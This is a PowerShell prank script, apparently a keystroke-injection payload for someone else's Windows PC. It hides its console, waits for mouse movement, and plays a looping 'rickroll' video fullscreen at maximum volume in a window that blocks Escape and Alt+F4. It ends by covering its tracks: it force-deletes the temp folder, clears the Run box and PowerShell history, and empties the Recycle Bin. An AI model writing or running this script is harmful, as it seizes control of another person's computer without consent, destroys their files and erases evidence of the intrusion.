$i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
add-type -name win -member $i -namespace native;
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
function Target-Comes {
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell
    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}
#############################################################################################################################################
#WPF Library for Playing Movie and some components
Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName System.ComponentModel
#XAML File of WPF as windows for playing movie - FIXED: Removed event attributes from MediaElement to avoid parse errors
[xml]$XAML = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="PowerShell Video Player" WindowState="Maximized" ResizeMode="NoResize" WindowStartupLocation="CenterScreen"
        WindowStyle="None" Topmost="True" AllowsTransparency="True">
    <Grid>
        <MediaElement Stretch="Fill" Name="VideoPlayer" LoadedBehavior="Manual" UnloadedBehavior="Stop" />
        <TextBlock Name="ErrorText" Text="Loading Video..." Foreground="White" FontSize="24" HorizontalAlignment="Center"
                   VerticalAlignment="Center" Visibility="Collapsed" />
    </Grid>
</Window>
"@
#Movie Path - FIXED for flat extract: $env:TMP\rr\rr.mp4
$videoPath = "$env:TMP\rr\rr.mp4".Replace('\', '/')
$VideoSource = New-Object Uri("file:///$videoPath")
#Load XAML
$XAMLReader=(New-Object System.Xml.XmlNodeReader $XAML)
$Window=[Windows.Markup.XamlReader]::Load( $XAMLReader )
$VideoPlayer = $Window.FindName("VideoPlayer")
$ErrorText = $Window.FindName("ErrorText")
#Video Default Setting
$VideoPlayer.Volume = 100
$VideoPlayer.Source = $VideoSource
# Event Handlers (loop video + error fallback) - Added after load, no XAML attributes needed
$VideoPlayer.add_MediaEnded({
    $this.Position = [TimeSpan]::Zero
    $this.Play()
})
$VideoPlayer.add_MediaFailed({
    $ErrorText.Visibility = 'Visible'
    $ErrorText.Text = "Error loading media... (But you're still rickrolled!)"
})
# Trap closing (ignore ESC, etc. - user needs Task Manager)
$Window.add_KeyDown({
    if ($_.Key -eq 'Escape' -or ($_.SystemKey -eq 'Alt' -and $_.Key -eq 'F4')) {
        $_.Handled = $true
    }
})
Target-Comes

# Max system volume before play
Add-Type -TypeDefinition @'
using System.Runtime.InteropServices;
[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IAudioEndpointVolume
{
    // f(), g(), ... are unused COM method slots. Define these if you care
    int f(); int g(); int h(); int i();
    int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);
    int j();
    int GetMasterVolumeLevelScalar(out float pfLevel);
    int k(); int l(); int m(); int n();
    int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, System.Guid pguidEventContext);
    int GetMute(out bool pbMute);
}
[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDevice
{
    int Activate(ref System.Guid id, int clsCtx, int activationParams, out IAudioEndpointVolume aev);
}
[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDeviceEnumerator
{
    int f(); // Unused
    int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);
}
[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }
public class Audio
{
    static IAudioEndpointVolume Vol()
    {
        var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;
        IMMDevice dev = null;
        Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(/*eRender*/ 0, /*eMultimedia*/ 1, out dev));
        IAudioEndpointVolume epv = null;
        var epvid = typeof(IAudioEndpointVolume).GUID;
        Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, /*CLSCTX_ALL*/ 23, 0, out epv));
        return epv;
    }
    public static float Volume
    {
        get { float v = -1; Marshal.ThrowExceptionForHR(Vol().GetMasterVolumeLevelScalar(out v)); return v; }
        set { Marshal.ThrowExceptionForHR(Vol().SetMasterVolumeLevelScalar(value, System.Guid.Empty)); }
    }
    public static bool Mute
    {
        get { bool mute; Marshal.ThrowExceptionForHR(Vol().GetMute(out mute)); return mute; }
        set { Marshal.ThrowExceptionForHR(Vol().SetMute(value, System.Guid.Empty)); }
    }
}
'@

# Unmute and set system volume to max (100%)
[audio]::Mute = $false
[audio]::Volume = 1.0

$VideoPlayer.Play()
#Show Up the Window
$Window.ShowDialog() | out-null
# Turn off capslock if left on
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
if ($caps -eq $true){$key = New-Object -ComObject WScript.Shell;$key.SendKeys('{CapsLock}')}
# empty temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
# Delete powershell history
Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue